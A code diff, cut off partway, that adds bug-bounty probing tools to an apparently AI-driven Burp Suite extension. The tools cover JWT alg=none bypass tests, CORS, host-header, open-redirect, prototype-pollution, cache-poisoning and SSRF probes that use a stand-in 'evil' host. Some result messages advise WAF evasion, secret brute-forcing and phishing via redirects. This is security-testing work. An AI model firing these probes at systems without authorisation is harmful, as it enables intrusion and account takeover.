@@ -6,6 +6,7 @@ import burp.api.montoya.http.HttpService;
 import burp.api.montoya.http.message.HttpHeader;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.params.HttpParameter;
+import burp.api.montoya.http.message.params.ParsedHttpParameter;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 import burp.api.montoya.intruder.HttpRequestTemplate;
@@ -17,6 +18,7 @@ import burp.api.montoya.scanner.audit.issues.AuditIssue;
 import burp.api.montoya.collaborator.CollaboratorPayload;
 import burp.api.montoya.collaborator.Interaction;
 import burp.api.montoya.http.message.params.HttpParameterType;
+import com.example.burpgemini.hunt.BbData;
 import com.example.burpgemini.hunt.IdentityStore;
 import com.example.burpgemini.hunt.OastManager;
 import com.example.burpgemini.hunt.Payloads;
@@ -31,6 +33,7 @@ import com.example.burpgemini.util.TextDiff;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
+import com.google.gson.JsonParser;
 
 import java.net.URLDecoder;
 import java.net.URLEncoder;
@@ -139,6 +142,38 @@ public final class ToolExecutor {
                     return testMassAssignment(args);
                 case "report_finding":
                     return reportFinding(args);
+                case "analyze_jwt":
+                    return analyzeJwt(args);
+                case "analyze_headers":
+                    return analyzeHeaders(args);
+                case "analyze_cookies":
+                    return analyzeCookies(args);
+                case "enumerate_subdomains":
+                    return enumerateSubdomains(args);
+                case "test_cors":
+                    return testCors(args);
+                case "test_host_header":
+                    return testHostHeader(args);
+                case "test_open_redirect":
+                    return testOpenRedirect(args);
+                case "test_prototype_pollution":
+                    return testPrototypePollution(args);
+                case "test_hpp":
+                    return testHpp(args);
+                case "check_subdomain_takeover":
+                    return checkSubdomainTakeover(args);
+                case "fingerprint_waf":
+                    return fingerprintWaf(args);
+                case "test_cache_poisoning":
+                    return testCachePoisoning(args);
+                case "discover_headers":
+                    return discoverHeaders(args);
+                case "test_ssrf":
+                    return testSsrf(args);
+                case "test_jwt":
+                    return testJwt(args);
+                case "smuggling_probe":
+                    return smugglingProbe(args);
                 case "decode_transform":
                     return decodeTransform(args);
                 case "to_curl":
@@ -2102,6 +2137,1005 @@ public final class ToolExecutor {
         return r;
     }
 
+    // ================================================================ bug-bounty tools
+
+    private static final String EVIL_HOST = "evil-acme-probe.com";
+
+    // ---- JWT ---------------------------------------------------------------
+
+    /** Decode a JWT and analyze it for common weaknesses (read-only, no crypto). */
+    private JsonObject analyzeJwt(JsonObject args) {
+        String token = getStr(args, "token", null);
+        if (token == null) {
+            Item it = resolve(getStr(args, "source", "proxy"), getStr(args, "id", null));
+            if (it != null) {
+                token = extractJwt(it.request);
+            }
+        }
+        if (token == null || token.isBlank()) {
+            return error("Provide a JWT 'token', or a source+id whose request carries one.");
+        }
+        String[] parts = token.trim().split("\\.");
+        if (parts.length < 2) {
+            return error("Not a JWT (need header.payload[.signature]).");
+        }
+        JsonObject header;
+        JsonObject payload;
+        try {
+            header = JsonParser.parseString(new String(java.util.Base64.getUrlDecoder()
+                    .decode(padB64(parts[0])), StandardCharsets.UTF_8)).getAsJsonObject();
+            payload = JsonParser.parseString(new String(java.util.Base64.getUrlDecoder()
+                    .decode(padB64(parts[1])), StandardCharsets.UTF_8)).getAsJsonObject();
+        } catch (RuntimeException e) {
+            return error("Could not decode JWT: " + e.getMessage());
+        }
+        JsonArray issues = new JsonArray();
+        String alg = header.has("alg") ? header.get("alg").getAsString() : "";
+        if (alg.equalsIgnoreCase("none")) {
+            issues.add("alg=none — signature not verified; try an unsigned token (test_jwt).");
+        }
+        if (alg.toUpperCase().startsWith("HS")) {
+            issues.add("HMAC alg (" + alg + ") — brute the secret offline (hashcat -m 16500); "
+                    + "if a public key is exposed, try RS256→HS256 key-confusion.");
+        }
+        if (header.has("kid")) {
+            issues.add("'kid' header present — test kid injection (path traversal / SQLi to control the key).");
+        }
+        if (header.has("jku") || header.has("x5u")) {
+            issues.add("'jku'/'x5u' present — test pointing it at an attacker-hosted JWKS (SSRF/key injection).");
+        }
+        boolean sigPresent = parts.length >= 3 && !parts[2].isEmpty();
+        if (!sigPresent) {
+            issues.add("Empty signature segment.");
+        }
+        if (!payload.has("exp")) {
+            issues.add("No 'exp' claim — token may never expire.");
+        } else {
+            try {
+                long exp = payload.get("exp").getAsLong();
+                if (exp * 1000L < System.currentTimeMillis()) {
+                    issues.add("Token is EXPIRED — check whether the server still accepts it (test_jwt).");
+                }
+            } catch (RuntimeException ignored) {
+                // non-numeric exp
+            }
+        }
+        for (String claim : new String[]{"role", "roles", "admin", "is_admin", "isAdmin", "scope",
+                "permissions", "user", "email", "sub"}) {
+            if (payload.has(claim)) {
+                issues.add("Claim '" + claim + "'=" + payload.get(claim) + " — try tampering it "
+                        + "(privilege escalation) if the signature can be bypassed.");
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("alg", alg);
+        r.add("header", header);
+        r.add("payload", payload);
+        r.addProperty("signature_present", sigPresent);
+        r.add("weaknesses", issues);
+        r.addProperty("note", "Static analysis only; signature NOT verified. Use test_jwt to actively "
+                + "check alg=none / signature-stripping acceptance.");
+        return r;
+    }
+
+    /** Actively test JWT auth bypass: resend the request with an alg=none / signature-stripped token. */
+    private JsonObject testJwt(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String token = getStr(args, "token", extractJwt(base));
+        if (token == null || token.isBlank()) {
+            return error("No JWT found on the request. Pass 'token' or a base request carrying a Bearer/cookie JWT.");
+        }
+        String[] parts = token.trim().split("\\.");
+        if (parts.length < 2) {
+            return error("Not a JWT.");
+        }
+        HttpRequestResponse baseRR = api.http().sendRequest(base);
+        int baseStatus = statusOf(baseRR);
+        String baseBody = bodyStr(baseRR);
+
+        // Variant tokens: alg=none (re-encoded header) + signature stripped.
+        String noneHeader = b64url("{\"alg\":\"none\",\"typ\":\"JWT\"}");
+        String noneToken = noneHeader + "." + parts[1] + ".";
+        String strippedToken = parts[0] + "." + parts[1] + ".";
+
+        JsonArray tests = new JsonArray();
+        boolean bypass = false;
+        for (String[] v : new String[][]{{"alg=none", noneToken}, {"signature-stripped", strippedToken}}) {
+            HttpRequest r = replaceJwt(base, token, v[1]);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            int st = statusOf(rr);
+            String body = bodyStr(rr);
+            double sim = ResponseDiff.similarity(baseBody, body);
+            boolean accepted = st == baseStatus && st > 0 && st < 400 && sim >= 0.85;
+            JsonObject o = new JsonObject();
+            o.addProperty("variant", v[0]);
+            o.addProperty("status", st);
+            o.addProperty("similarity_to_authed", round(sim));
+            o.addProperty("accepted", accepted);
+            tests.add(o);
+            if (accepted) {
+                bypass = true;
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("baseline_status", baseStatus);
+        r.add("tests", tests);
+        r.addProperty("bypass_detected", bypass);
+        r.addProperty("note", bypass
+                ? "A tampered token was accepted like the authenticated one — likely signature bypass. "
+                  + "Verify by changing a claim (e.g. sub/role) and confirming the app honors it."
+                : "Tampered tokens were rejected/behaved differently — no trivial signature bypass.");
+        return r;
+    }
+
+    // ---- header / cookie audits (read-only) --------------------------------
+
+    private JsonObject analyzeHeaders(JsonObject args) {
+        Item it = resolve(getStr(args, "source", "proxy"), getStr(args, "id", null));
+        if (it == null || it.response == null) {
+            return error("No captured response for that source/id.");
+        }
+        HttpResponse resp = it.response;
+        boolean secure = it.url != null && it.url.startsWith("https");
+        JsonArray missing = new JsonArray();
+        JsonArray present = new JsonArray();
+        JsonArray weak = new JsonArray();
+
+        checkHdr(resp, "Content-Security-Policy", missing, present, null);
+        String csp = resp.headerValue("Content-Security-Policy");
+        if (csp != null) {
+            String lc = csp.toLowerCase();
+            if (lc.contains("unsafe-inline")) {
+                weak.add("CSP allows 'unsafe-inline'");
+            }
+            if (lc.contains("unsafe-eval")) {
+                weak.add("CSP allows 'unsafe-eval'");
+            }
+            if (lc.contains("*")) {
+                weak.add("CSP contains a wildcard source");
+            }
+        }
+        if (secure) {
+            checkHdr(resp, "Strict-Transport-Security", missing, present, null);
+        }
+        checkHdr(resp, "X-Content-Type-Options", missing, present, null);
+        checkHdr(resp, "X-Frame-Options", missing, present, null);
+        checkHdr(resp, "Referrer-Policy", missing, present, null);
+        checkHdr(resp, "Permissions-Policy", missing, present, null);
+        checkHdr(resp, "Cross-Origin-Opener-Policy", missing, present, null);
+        checkHdr(resp, "Cross-Origin-Resource-Policy", missing, present, null);
+        checkHdr(resp, "Cross-Origin-Embedder-Policy", missing, present, null);
+
+        JsonArray disclosure = new JsonArray();
+        for (String h : new String[]{"Server", "X-Powered-By", "X-AspNet-Version", "X-Generator", "Via"}) {
+            String v = resp.headerValue(h);
+            if (v != null) {
+                disclosure.add(h + ": " + v);
+            }
+        }
+        int score = present.size() * 100 / Math.max(1, present.size() + missing.size());
+        JsonObject r = new JsonObject();
+        r.addProperty("url", it.url);
+        r.add("present", present);
+        r.add("missing", missing);
+        r.add("weaknesses", weak);
+        r.add("info_disclosure", disclosure);
+        r.addProperty("hardening_score", score + "% (" + grade(score) + ")");
+        r.addProperty("note", "Missing headers are usually Low/Info on their own but compound with other "
+                + "issues (e.g. missing X-Frame-Options + a sensitive action = clickjacking).");
+        return r;
+    }
+
+    private JsonObject analyzeCookies(JsonObject args) {
+        Item it = resolve(getStr(args, "source", "proxy"), getStr(args, "id", null));
+        if (it == null || it.response == null) {
+            return error("No captured response for that source/id.");
+        }
+        boolean secure = it.url != null && it.url.startsWith("https");
+        JsonArray cookies = new JsonArray();
+        for (HttpHeader h : it.response.headers()) {
+            if (!"set-cookie".equalsIgnoreCase(h.name())) {
+                continue;
+            }
+            String v = h.value();
+            String lc = v.toLowerCase();
+            String name = v.contains("=") ? v.substring(0, v.indexOf('=')) : v;
+            JsonObject o = new JsonObject();
+            o.addProperty("name", name);
+            JsonArray flags = new JsonArray();
+            if (!lc.contains("httponly")) {
+                flags.add("missing HttpOnly (readable by JS / XSS theft)");
+            }
+            if (secure && !lc.contains("secure")) {
+                flags.add("missing Secure (sent over HTTP)");
+            }
+            if (!lc.contains("samesite")) {
+                flags.add("missing SameSite (CSRF exposure)");
+            } else if (lc.contains("samesite=none")) {
+                flags.add("SameSite=None (cross-site sendable — CSRF if not otherwise protected)");
+            }
+            if (!name.startsWith("__Host-") && !name.startsWith("__Secure-")
+                    && (lc.contains("session") || lc.contains("auth") || lc.contains("token"))) {
+                flags.add("session cookie without __Host-/__Secure- prefix");
+            }
+            String cval = v.contains("=") ? v.substring(v.indexOf('=') + 1) : "";
+            if (cval.startsWith("eyJ")) {
+                flags.add("value looks like a JWT — analyze_jwt it");
+            }
+            o.add("issues", flags);
+            cookies.add(o);
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", it.url);
+        r.add("cookies", cookies);
+        r.addProperty("count", cookies.size());
+        return r;
+    }
+
+    // ---- recon: subdomains & takeover --------------------------------------
+
+    private JsonObject enumerateSubdomains(JsonObject args) {
+        String base = getStr(args, "base_url", null);
+        String apex = getStr(args, "apex", null);
+        if (apex == null && base != null) {
+            apex = apexOf(hostOfUrl(base));
+        }
+        java.util.TreeSet<String> hosts = new java.util.TreeSet<>();
+        for (ProxyHttpRequestResponse h : api.proxy().history()) {
+            String host = hostOf(h);
+            if (!host.isEmpty()) {
+                hosts.add(host.toLowerCase());
+            }
+        }
+        for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
+            String host = hostOfUrl(urlOf(rr));
+            if (host != null) {
+                hosts.add(host.toLowerCase());
+            }
+        }
+        JsonArray inApex = new JsonArray();
+        JsonArray other = new JsonArray();
+        for (String host : hosts) {
+            JsonObject o = new JsonObject();
+            o.addProperty("host", host);
+            o.addProperty("in_scope", isInScope("https://" + host + "/"));
+            if (apex != null && (host.equals(apex) || host.endsWith("." + apex))) {
+                inApex.add(o);
+            } else {
+                other.add(o);
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("apex", apex == null ? "(not derived)" : apex);
+        r.add("subdomains_of_apex", inApex);
+        r.add("other_hosts", other);
+        r.addProperty("total", hosts.size());
+        r.addProperty("note", "Subdomains seen in captured traffic/site map. Check any out-of-scope ones "
+                + "against the program scope before testing; run check_subdomain_takeover on dangling ones.");
+        return r;
+    }
+
+    private JsonObject checkSubdomainTakeover(JsonObject args) {
+        String url = getStr(args, "url", null);
+        if (url == null || url.isBlank()) {
+            return error("url is required (e.g. https://sub.example.com/).");
+        }
+        HttpRequestResponse rr;
+        try {
+            rr = api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
+        } catch (RuntimeException e) {
+            JsonObject r = new JsonObject();
+            r.addProperty("url", url);
+            r.addProperty("resolved", false);
+            r.addProperty("note", "Host did not resolve/connect (" + e.getMessage() + "). A dangling CNAME "
+                    + "to a de-provisioned service is itself a takeover signal — verify DNS (dig CNAME).");
+            return r;
+        }
+        String body = bodyStr(rr);
+        String matched = null;
+        String service = null;
+        for (String[] fp : BbData.TAKEOVER_FINGERPRINTS) {
+            if (body.contains(fp[0])) {
+                matched = fp[0];
+                service = fp[1];
+                break;
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", url);
+        r.addProperty("status", statusOf(rr));
+        r.addProperty("vulnerable_candidate", matched != null);
+        if (matched != null) {
+            r.addProperty("service", service);
+            r.addProperty("fingerprint", matched);
+            findings.addFinding(new PassiveFinding("Subdomain takeover candidate (" + service + ")",
+                    "High", "Tentative", url, "Orphan fingerprint matched: \"" + matched + "\".", true));
+            r.addProperty("note", "Orphan fingerprint for " + service + " — confirm the dangling DNS "
+                    + "(dig CNAME) and claim per can-i-take-over-xyz before reporting.");
+        } else {
+            r.addProperty("note", "No known takeover fingerprint in the response.");
+        }
+        return r;
+    }
+
+    // ---- CORS --------------------------------------------------------------
+
+    private JsonObject testCors(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String host = hostOfUrl(base.url());
+        String apex = apexOf(host);
+        JsonArray results = new JsonArray();
+        boolean exploitable = false;
+        for (String tmpl : BbData.CORS_ORIGIN_TEMPLATES) {
+            String origin = tmpl.replace("{HOST}", host == null ? "" : host)
+                    .replace("{APEX}", apex == null ? "" : apex);
+            HttpRequest r = base.withUpdatedHeader("Origin", origin);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            HttpResponse resp = rr.response();
+            if (resp == null) {
+                continue;
+            }
+            String acao = resp.headerValue("Access-Control-Allow-Origin");
+            boolean acac = "true".equalsIgnoreCase(resp.headerValue("Access-Control-Allow-Credentials"));
+            boolean reflects = acao != null && (acao.equals(origin)
+                    || (origin.equals("null") && "null".equalsIgnoreCase(acao.trim())));
+            if (acao != null) {
+                JsonObject o = new JsonObject();
+                o.addProperty("origin", origin);
+                o.addProperty("acao", acao);
+                o.addProperty("acac", acac);
+                o.addProperty("reflected", reflects);
+                results.add(o);
+                if (reflects && acac) {
+                    exploitable = true;
+                    findings.addFinding(new PassiveFinding("CORS misconfiguration (exploitable)", "High",
+                            "Firm", base.url(), "ACAO reflects Origin " + origin
+                            + " with Allow-Credentials: true — cross-origin creds theft.", true));
+                }
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.add("results", results);
+        r.addProperty("exploitable", exploitable);
+        r.addProperty("note", exploitable
+                ? "Reflected Origin + Allow-Credentials = an attacker page can read authenticated responses."
+                : "Look for a reflected Origin (even without credentials it can leak data) or a "
+                  + "null-origin acceptance.");
+        return r;
+    }
+
+    // ---- Host-header injection ---------------------------------------------
+
+    private JsonObject testHostHeader(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        JsonArray results = new JsonArray();
+        boolean reflected = false;
+        for (String h : BbData.HOST_INJECT_HEADERS) {
+            HttpRequest r = "Host".equalsIgnoreCase(h)
+                    ? base.withUpdatedHeader("Host", EVIL_HOST)
+                    : base.withUpdatedHeader(h, EVIL_HOST);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            HttpResponse resp = rr.response();
+            if (resp == null) {
+                continue;
+            }
+            String body = resp.bodyToString();
+            String loc = resp.headerValue("Location");
+            boolean inBody = body.contains(EVIL_HOST);
+            boolean inLoc = loc != null && loc.contains(EVIL_HOST);
+            if (inBody || inLoc) {
+                reflected = true;
+                JsonObject o = new JsonObject();
+                o.addProperty("header", h);
+                o.addProperty("status", resp.statusCode());
+                o.addProperty("reflected_in", inLoc ? "Location" : "body");
+                if (inLoc) {
+                    o.addProperty("location", loc);
+                }
+                results.add(o);
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.add("reflections", results);
+        r.addProperty("injectable", reflected);
+        r.addProperty("note", reflected
+                ? "Host/X-Forwarded-Host is reflected — test password-reset poisoning (reset link points "
+                  + "to your host), cache poisoning, and routing-based SSRF."
+                : "No reflection of an injected host observed.");
+        return r;
+    }
+
+    // ---- open redirect -----------------------------------------------------
+
+    private JsonObject testOpenRedirect(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String host = hostOfUrl(base.url());
+        List<String> params = new ArrayList<>();
+        String given = getStr(args, "param_name", null);
+        if (given != null) {
+            params.add(given);
+        } else {
+            for (ParsedHttpParameter p : base.parameters()) {
+                String pn = p.name() == null ? "" : p.name().toLowerCase();
+                for (String rp : new String[]{"redirect", "url", "next", "return", "returnurl",
+                        "return_url", "continue", "dest", "goto", "callback", "redir", "target", "to"}) {
+                    if (pn.equals(rp)) {
+                        params.add(p.name());
+                        break;
+                    }
+                }
+            }
+        }
+        if (params.isEmpty()) {
+            return error("No redirect-like parameter found. Pass param_name to force one.");
+        }
+        JsonArray hits = new JsonArray();
+        boolean vuln = false;
+        for (String param : params) {
+            for (String tmpl : BbData.OPEN_REDIRECT_PAYLOADS) {
+                String payload = tmpl.replace("{EVIL}", EVIL_HOST).replace("{TARGET}", host == null ? "" : host);
+                HttpRequest r = injectParam(base, param, "url", payload);
+                HttpRequestResponse rr = api.http().sendRequest(r);
+                HttpResponse resp = rr.response();
+                if (resp == null) {
+                    continue;
+                }
+                String loc = resp.headerValue("Location");
+                int st = resp.statusCode();
+                boolean redirectToEvil = st >= 300 && st < 400 && loc != null
+                        && loc.contains(EVIL_HOST) && !loc.contains(host == null ? " " : host + "/");
+                boolean bodyRedirect = resp.bodyToString().contains("url=" + payload)
+                        || resp.bodyToString().contains("location=\"" + payload);
+                if (redirectToEvil || bodyRedirect) {
+                    vuln = true;
+                    JsonObject o = new JsonObject();
+                    o.addProperty("param", param);
+                    o.addProperty("payload", payload);
+                    o.addProperty("status", st);
+                    if (loc != null) {
+                        o.addProperty("location", loc);
+                    }
+                    hits.add(o);
+                    findings.addFinding(new PassiveFinding("Open redirect", "Medium", "Firm", base.url(),
+                            "Param '" + param + "'=" + payload + " redirects to " + EVIL_HOST + ".", true));
+                    break;
+                }
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.add("params_tested", toStrArray(params));
+        r.add("hits", hits);
+        r.addProperty("vulnerable", vuln);
+        r.addProperty("note", vuln
+                ? "Open redirect confirmed — chain with OAuth (token/code theft via redirect_uri) or use "
+                  + "for phishing/filter-bypass."
+                : "No off-site redirect observed. Try a param revealed by discover_params, or the OAuth "
+                  + "redirect_uri.");
+        return r;
+    }
+
+    // ---- prototype pollution ----------------------------------------------
+
+    private JsonObject testPrototypePollution(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        HttpRequestResponse baseRR = api.http().sendRequest(base);
+        int baseStatus = statusOf(baseRR);
+        String baseBody = bodyStr(baseRR);
+        JsonArray signals = new JsonArray();
+
+        // URL-based
+        for (String p : BbData.PROTO_POLLUTION_URL) {
+            String path = base.path();
+            String sep = path.contains("?") ? "&" : "?";
+            HttpRequest r = base.withPath(path + sep + p);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            recordPpSignal(signals, "url:" + p, rr, baseStatus, baseBody);
+        }
+        // JSON body (if the request is JSON)
+        String ct = headerValue(base, "Content-Type");
+        if (ct != null && ct.toLowerCase().contains("json")) {
+            HttpRequest r = base.withMethod(base.method().equals("GET") ? "POST" : base.method())
+                    .withBody(BbData.PROTO_POLLUTION_JSON);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            recordPpSignal(signals, "json-body", rr, baseStatus, baseBody);
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.add("signals", signals);
+        r.addProperty("note", "Server-side prototype-pollution signals are indirect (reflected marker, "
+                + "status/behavior change, or a 500). Confirm with a gadget (e.g. status/JSON key that "
+                + "flips). For client-side PP, analyze_client_side + mine_javascript the bundle.");
+        return r;
+    }
+
+    private void recordPpSignal(JsonArray signals, String vector, HttpRequestResponse rr,
+                                int baseStatus, String baseBody) {
+        String body = bodyStr(rr);
+        int st = statusOf(rr);
+        boolean reflected = body.contains(BbData.PROTO_POLLUTION_MARKER)
+                && body.contains(BbData.PROTO_POLLUTION_VALUE);
+        JsonObject cmp = ResponseDiff.compare(baseStatus, baseBody, st, body);
+        boolean changed = cmp.get("significantly_different").getAsBoolean();
+        if (reflected || st >= 500 || changed) {
+            JsonObject o = new JsonObject();
+            o.addProperty("vector", vector);
+            o.addProperty("status", st);
+            o.addProperty("marker_reflected", reflected);
+            o.addProperty("changed_or_error", changed || st >= 500);
+            signals.add(o);
+        }
+    }
+
+    // ---- HTTP parameter pollution -----------------------------------------
+
+    private JsonObject testHpp(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String param = getStr(args, "param_name", null);
+        if (param == null) {
+            for (ParsedHttpParameter p : base.parameters()) {
+                if (p.type() == HttpParameterType.URL) {
+                    param = p.name();
+                    break;
+                }
+            }
+        }
+        if (param == null) {
+            return error("No URL parameter to pollute. Pass param_name.");
+        }
+        String a = "hppAAA";
+        String b = "hppBBB";
+        // Duplicate the parameter: name=a&name=b via a raw query append.
+        String path = base.path();
+        String sep = path.contains("?") ? "&" : "?";
+        HttpRequest dup = base.withPath(path + sep + urlEnc(param) + "=" + a + "&" + urlEnc(param) + "=" + b);
+        HttpRequestResponse rr = api.http().sendRequest(dup);
+        String body = bodyStr(rr);
+        String honored = body.contains(a) && !body.contains(b) ? "first (" + a + ")"
+                : body.contains(b) && !body.contains(a) ? "last (" + b + ")"
+                : body.contains(a) && body.contains(b) ? "both (concatenated?)" : "neither reflected";
+        JsonObject r = new JsonObject();
+        r.addProperty("url", dup.url());
+        r.addProperty("param", param);
+        r.addProperty("status", statusOf(rr));
+        r.addProperty("value_honored", honored);
+        r.addProperty("note", "Which duplicate the server picks (first/last/both) can bypass WAFs and "
+                + "access controls that only inspect one occurrence. Compare with a single-value baseline.");
+        return r;
+    }
+
+    // ---- WAF fingerprint ---------------------------------------------------
+
+    private JsonObject fingerprintWaf(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            String url = getStr(args, "url", null);
+            if (url == null) {
+                return error(e.getMessage() + " (or pass a url).");
+            }
+            base = HttpRequest.httpRequestFromUrl(url);
+        }
+        HttpRequestResponse baseRR = api.http().sendRequest(base);
+        int baseStatus = statusOf(baseRR);
+        // Trip the WAF with a benign-but-attacky query.
+        String path = base.path();
+        String sep = path.contains("?") ? "&" : "?";
+        HttpRequest trig = base.withPath(path + sep + BbData.WAF_TRIGGER.substring(1));
+        HttpRequestResponse trigRR = api.http().sendRequest(trig);
+        HttpResponse tresp = trigRR.response();
+
+        java.util.LinkedHashSet<String> wafs = new java.util.LinkedHashSet<>();
+        String hay = "";
+        if (tresp != null) {
+            StringBuilder sb = new StringBuilder();
+            for (HttpHeader h : tresp.headers()) {
+                sb.append(h.name()).append(": ").append(h.value()).append('\n');
+            }
+            sb.append(tresp.bodyToString());
+            hay = sb.toString();
+        }
+        // Also check baseline headers (WAF markers are often always present).
+        if (baseRR.response() != null) {
+            for (HttpHeader h : baseRR.response().headers()) {
+                hay += "\n" + h.name() + ": " + h.value();
+            }
+        }
+        for (String[] sig : BbData.WAF_SIGNATURES) {
+            if (hay.toLowerCase().contains(sig[0].toLowerCase())) {
+                wafs.add(sig[1]);
+            }
+        }
+        int trigStatus = statusOf(trigRR);
+        boolean blocked = tresp != null && (trigStatus == 403 || trigStatus == 406 || trigStatus == 429
+                || trigStatus == 501 || (trigStatus != baseStatus && trigStatus >= 400));
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("baseline_status", baseStatus);
+        r.addProperty("trigger_status", trigStatus);
+        r.addProperty("blocked_attack_payload", blocked);
+        r.add("waf_detected", toStrArray(new ArrayList<>(wafs)));
+        r.addProperty("note", wafs.isEmpty() && !blocked
+                ? "No WAF fingerprint or block seen — payloads likely reach the app directly."
+                : "A WAF is in front. Tune payloads to evade it (encoding, case, HPP, chunking) and prefer "
+                  + "OAST-based blind detection.");
+        return r;
+    }
+
+    // ---- web cache poisoning ----------------------------------------------
+
+    private JsonObject testCachePoisoning(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        // Cache-buster so recon doesn't poison the real cache for other users.
+        String cb = "cb" + System.nanoTime();
+        String path = base.path();
+        String sep = path.contains("?") ? "&" : "?";
+        HttpRequest busted = base.withPath(path + sep + cb + "=1");
+
+        HttpRequestResponse baseRR = api.http().sendRequest(busted);
+        boolean cacheable = looksCacheable(baseRR.response());
+        JsonArray reflected = new JsonArray();
+        for (String h : BbData.UNKEYED_HEADERS) {
+            String canary = EVIL_HOST;
+            HttpRequest r = busted.withUpdatedHeader(h, canary);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            HttpResponse resp = rr.response();
+            if (resp == null) {
+                continue;
+            }
+            String body = resp.bodyToString();
+            String loc = resp.headerValue("Location");
+            boolean inBody = body.contains(canary);
+            boolean inLoc = loc != null && loc.contains(canary);
+            if (inBody || inLoc) {
+                JsonObject o = new JsonObject();
+                o.addProperty("header", h);
+                o.addProperty("reflected_in", inLoc ? "Location" : "body");
+                o.addProperty("cache_indicators", cacheHeaders(resp));
+                reflected.add(o);
+            }
+        }
+        boolean promising = reflected.size() > 0 && cacheable;
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("looks_cacheable", cacheable);
+        r.add("reflected_unkeyed_headers", reflected);
+        r.addProperty("note", promising
+                ? "An unkeyed header is reflected AND the response looks cacheable — strong cache-poisoning "
+                  + "candidate. Verify the poisoned response is served to a second (header-less) request to "
+                  + "the same cache-busted URL before reporting."
+                : reflected.size() > 0
+                    ? "Unkeyed header reflected but caching is unclear — check Cache-Control/Age/X-Cache."
+                    : "No unkeyed header reflected. Try discover_headers to find app-specific ones.");
+        return r;
+    }
+
+    // ---- hidden header discovery (Param-Miner style) -----------------------
+
+    private JsonObject discoverHeaders(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String[] words = customList(args, "wordlist", BbData.HEADER_WORDLIST);
+        HttpRequestResponse baseRR = api.http().sendRequest(base);
+        int baseStatus = statusOf(baseRR);
+        String baseBody = bodyStr(baseRR);
+        JsonArray hits = new JsonArray();
+        int tried = 0;
+        for (String h : words) {
+            if (tried >= 40) {
+                break;
+            }
+            tried++;
+            String canary = "hdrcx" + tried;
+            HttpRequest r = base.hasHeader(h) ? base.withUpdatedHeader(h, canary) : base.withAddedHeader(h, canary);
+            HttpRequestResponse rr = api.http().sendRequest(r);
+            String body = bodyStr(rr);
+            boolean reflected = body.contains(canary);
+            JsonObject cmp = ResponseDiff.compare(baseStatus, baseBody, statusOf(rr), body);
+            boolean changed = cmp.get("significantly_different").getAsBoolean();
+            if (reflected || changed) {
+                JsonObject o = new JsonObject();
+                o.addProperty("header", h);
+                o.addProperty("reflected", reflected);
+                o.addProperty("changed_response", changed);
+                o.addProperty("status", statusOf(rr));
+                hits.add(o);
+            }
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("tried", tried);
+        r.add("interesting_headers", hits);
+        r.addProperty("note", "Reflected/behavior-changing headers → test for cache poisoning "
+                + "(test_cache_poisoning), access-control bypass (X-Original-URL, X-Forwarded-For for IP "
+                + "allowlists), and host injection.");
+        return r;
+    }
+
+    // ---- SSRF (OAST) -------------------------------------------------------
+
+    private JsonObject testSsrf(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        String domain = getStr(args, "oast_domain", null);
+        String label = getStr(args, "label", "ssrf");
+        try {
+            if (domain == null || domain.isBlank()) {
+                domain = oast.generate(label).toString();
+            }
+        } catch (RuntimeException e) {
+            return error("Collaborator/OAST unavailable: " + e.getMessage()
+                    + " — pass an oast_domain from your own interact.sh, or use test_injection oracle=oob.");
+        }
+        String oastUrl = "http://" + domain + "/";
+        JsonArray injected = new JsonArray();
+        // 1) URL-ish params get the OAST URL.
+        for (ParsedHttpParameter p : base.parameters()) {
+            String pn = p.name() == null ? "" : p.name().toLowerCase();
